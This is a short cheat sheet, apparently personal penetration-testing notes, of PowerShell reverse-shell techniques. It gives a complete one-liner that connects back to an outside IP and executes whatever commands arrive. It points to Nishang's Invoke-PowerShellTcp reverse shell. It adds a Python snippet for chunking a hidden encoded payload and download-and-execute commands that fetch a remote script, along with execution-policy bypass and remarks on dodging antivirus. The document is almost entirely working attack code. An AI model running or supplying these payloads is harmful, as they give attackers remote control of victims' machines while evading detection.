### PowerShell Reverse Shells

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient("192.168.157.131",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Payload 
```shell
#https://github.com/samratashok/nishang
/opt/nishang/Shells/Invoke-PowerShellTcp.ps1

#edit the code and add
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.216 -Port 443

```


### Format paylaod

```python
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```


### Trigger payload

```shell
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.1.1.246/Invoke-PowerShellTcp.ps1')

#IWR works with new powershell versions / kinda AV

#Old version powershell => New-object
powershell -c 'IEX (New-Object Net.WebClient).downloadString(http://192.168.119.216/Invoke-PowerShellTcp.ps1)'

powershell -nop -exec bypass -enc nazkeikazej==
```



you can code your payload base64 to avoid bad chars [[No BAD CHARS]]
